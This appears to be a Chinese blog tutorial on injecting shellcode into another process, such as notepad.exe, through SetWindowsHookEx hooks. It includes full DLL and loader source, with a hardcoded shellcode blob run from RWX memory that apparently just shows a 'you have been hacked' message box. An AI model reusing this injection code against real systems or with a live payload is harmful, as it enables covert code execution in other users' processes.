# 0x01 API 解析

看到了很多关于钩子注入 `Hook inject` 的文章，但主要是 DLL 注入。本文将尝试实现通过 Hooking 技术在远程进程中注入 Shellcode。

主要使用的是 `SetWindowsHookEx` 这个 API。

> SetWindowsHookEx 用于将应用程序定义的挂钩过程安装到挂钩链中。您将安装一个挂钩过程来监视系统中的某些类型的事件。这些事件与特定线程或与调用线程在同一桌面上的所有线程相关联。

```
HHOOK SetWindowsHookEx(
  int       idHook,
  HOOKPROC  lpfn,
  HINSTANCE hmod,
  DWORD     dwThreadId
);
```

调用示例：

```
HMODULE library = LoadLibraryA("dllhook.dll");
HOOKPROC hookProc = (HOOKPROC)GetProcAddress(library, "spotlessExport");
HHOOK hook = SetWindowsHookEx(WH_KEYBOARD, hookProc, library, 0);
```

可以看到**第二个参数** `HOOKPROC lpfn` 是指向钩子程序的指针。在这里所谓的钩子程序的具体内容是：

```
BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
	case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

extern "C" __declspec(dllexport) int spotlessExport() {
	unsigned char shellcode[] =
		"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41\x51"
		"\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x3e\x48"
		"\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72\x50\x3e\x48"
		"\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02"
		"\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x3e"
		"\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48\x01\xd0\x3e\x8b\x80\x88"
		"\x00\x00\x00\x48\x85\xc0\x74\x6f\x48\x01\xd0\x50\x3e\x8b\x48"
		"\x18\x3e\x44\x8b\x40\x20\x49\x01\xd0\xe3\x5c\x48\xff\xc9\x3e"
		"\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41"
		"\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24"
		"\x08\x45\x39\xd1\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0"
		"\x66\x3e\x41\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e"
		"\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41"
		"\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
		"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7\xc1"
		"\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e\x4c\x8d"
		"\x85\x33\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83\x56\x07\xff"
		"\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48"
		"\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13"
		"\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x59\x6f\x75\x20\x68"
		"\x61\x76\x65\x20\x62\x65\x65\x6e\x20\x68\x61\x63\x6b\x65\x64"
		"\x20\x5e\x5f\x5e\x00\x49\x6d\x70\x6f\x72\x74\x61\x6e\x74\x20"
		"\x57\x61\x72\x6e\x69\x6e\x67\x21\x00";
	void *exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, shellcode, sizeof shellcode);
	((void(*)())exec)();
	
	return 0;
}
```

可以看到钩子程序 `spotlessExport` 是一个 DLL 的导出函数。其具体内容是在当前进程的内存中分配 Shellcode 大小的空间、写入 Shellcode 并执行 Shellcode。

**第三个参数** `HINSTANCE hmod` 是一个指向钩子程序的 DLL 句柄，也就是包含钩子函数的 DLL 的模块句柄。


**第四个参数** `DWORD     dwThreadId` 是与钩子程序关联的线程标识符。如果此参数为0，则钩子过程与系统中所有线程相关联。这个参数主要是用于区分是局部钩子还是全局钩子。

>根据钩子作用的范围不同，它们又可分为局部钩子和全局钩子。局部钩子是针对某个线程的；而全局钩子则作用于整个系统中基于消息的应用。全局钩子需要使用 DLL 文件，在 DLL 中实现相应的钩子函数。

所以在这里不是作用于某个线程、对其拦截和监视消息，而是作用于整个系统中基于消息的应用。所以这个参数传0。


**第一个参数** `int idHook` 指定`挂钩过程`的类型。

>拦截特定类型事件的函数称为挂钩过程。挂接过程可以对接收到的每个事件进行操作，然后修改或丢弃该事件。

在这里示例中传入的是 `WH_KEYBOARD`。

>WH_KEYBOARD
2
安装挂钩过程，以监视击键消息。


比如 `notepad.exe` 对应的进程可能有击键消息，但是另一些进程可能没有比如 `svchost.exe`。而如果我想监视每个进程都会有的一个消息，我可以选用 `WH_GETMESSAGE` 挂钩过程。

>WH_GETMESSAGE
3
安装挂钩过程，以监视发布到消息队列的消息。


因为 `WH_GETMESSAGE` 类型的钩子会监视消息队列，并且 Windows 系统是基于消息驱动的，所以所有进程都会有自己的一个消息队列，都会加载 `WH_GETMESSAGE` 类型的全局钩子 DLL。总之将第一个参数设置为 `WH_GETMESSAGE` 表示安装消息队列的消息钩子，它可以监视发送到消息队列的消息。

# 0x02 实现思路


- Shellcode 的执行主要通过将其编译为一个 DLL 的导出函数，然后传入 `SetWindowsHookEx` API 的第二个参数作为钩子程序来执行。


然后在主程序中这样调用 `SetWindowsHookEx` API：

```
HMODULE library = LoadLibraryA("dllhook.dll");
HOOKPROC hookProc = (HOOKPROC)GetProcAddress(library, "spotlessExport");
HHOOK hook = SetWindowsHookEx(WH_GETMESSAGE, hookProc, library, 10600);
```

- `10600` 是一个 notepad.exe 进程的主线程的 pid。因为我只想把代码注入这一个进程中并执行。


# 0x03 代码实现

```
// dllhook.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

extern "C" __declspec(dllexport) int spotlessExport() {
	unsigned char shellcode[] =
		"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41\x51"
		"\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x3e\x48"
		"\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72\x50\x3e\x48"
		"\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02"
		"\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x3e"
		"\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48\x01\xd0\x3e\x8b\x80\x88"
		"\x00\x00\x00\x48\x85\xc0\x74\x6f\x48\x01\xd0\x50\x3e\x8b\x48"
		"\x18\x3e\x44\x8b\x40\x20\x49\x01\xd0\xe3\x5c\x48\xff\xc9\x3e"
		"\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41"
		"\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24"
		"\x08\x45\x39\xd1\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0"
		"\x66\x3e\x41\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e"
		"\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41"
		"\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
		"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7\xc1"
		"\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e\x4c\x8d"
		"\x85\x33\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83\x56\x07\xff"
		"\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48"
		"\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13"
		"\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x59\x6f\x75\x20\x68"
		"\x61\x76\x65\x20\x62\x65\x65\x6e\x20\x68\x61\x63\x6b\x65\x64"
		"\x20\x5e\x5f\x5e\x00\x49\x6d\x70\x6f\x72\x74\x61\x6e\x74\x20"
		"\x57\x61\x72\x6e\x69\x6e\x67\x21\x00";
	void* exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, shellcode, sizeof shellcode);
	((void(*)())exec)();

	return 0;
}
```

编译时注意编译选项特别是 `多线程/MT`，编译完之后扔到 CFF Explorer 检查一下导出函数：

```
00000001	00001010	0000	00014653	spotlessExport
```
确认无误后，把 dll 重命名为 `dllhook.dll` 然后丢到跟 EXE 同目录下。


Hooks.cpp：
```
//Hooks.cpp
#include <iostream>
#include <Windows.h>
#include <stdio.h>
#include <windows.h>
#include <tlhelp32.h>
#include <string.h>


DWORD GetMainThreadIdFromName(LPCSTR szName);


// 由进程名获取主线程ID(需要头文件tlhelp32.h)
// 失败返回0
DWORD GetMainThreadIdFromName(LPCSTR szName)
{
    DWORD idThread = 0;         // 进程ID
    DWORD idProcess = 0;        // 主线程ID

    // 获取进程ID
    PROCESSENTRY32 pe;      // 进程信息
    pe.dwSize = sizeof(PROCESSENTRY32);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); // 获取系统进程列表
    if (Process32First(hSnapshot, &pe))      // 返回系统中第一个进程的信息
    {
        do
        {
            if (0 == _stricmp(pe.szExeFile, szName)) // 不区分大小写比较
            {
                idProcess = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &pe));      // 下一个进程
    }
    CloseHandle(hSnapshot); // 删除快照
    if (idProcess == 0)
    {
        return 0;
    }

    // 获取进程的主线程ID
    THREADENTRY32 te;       // 线程信息
    te.dwSize = sizeof(THREADENTRY32);
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0); // 系统所有线程快照
    if (Thread32First(hSnapshot, &te))       // 第一个线程
    {
        do
        {
            if (idProcess == te.th32OwnerProcessID)      // 认为找到的第一个该进程的线程为主线程
            {
                idThread = te.th32ThreadID;
                break;
            }
        } while (Thread32Next(hSnapshot, &te));           // 下一个线程
    }
    CloseHandle(hSnapshot); // 删除快照
    return idThread;
}


int main()
{
	HMODULE library = LoadLibraryA("dllhook.dll");
	HOOKPROC hookProc = (HOOKPROC)GetProcAddress(library, "spotlessExport");
	printf("library = %p\n", library);
	printf("hookProc = %p\n",hookProc);
    DWORD tid = GetMainThreadIdFromName("notepad.exe");
    printf("tid = %d\n", tid);
	HHOOK hook = SetWindowsHookEx(WH_GETMESSAGE, hookProc, library, tid);
    
    printf("hook = %p\n", hook);
	printf("GetLastError = %u",GetLastError());
	Sleep(10 * 1000);
	UnhookWindowsHookEx(hook);

	return 0;
}
}
```


理论上这样是可行的，但实际测试没有弹框而且 notepad.exe 会崩。


把关键那行代码改成这样就行了：

```
HHOOK hook = SetWindowsHookEx(WH_KEYBOARD, hookProc, library, 0);
```

但这样还是全局挂钩注入。

留坑待填。

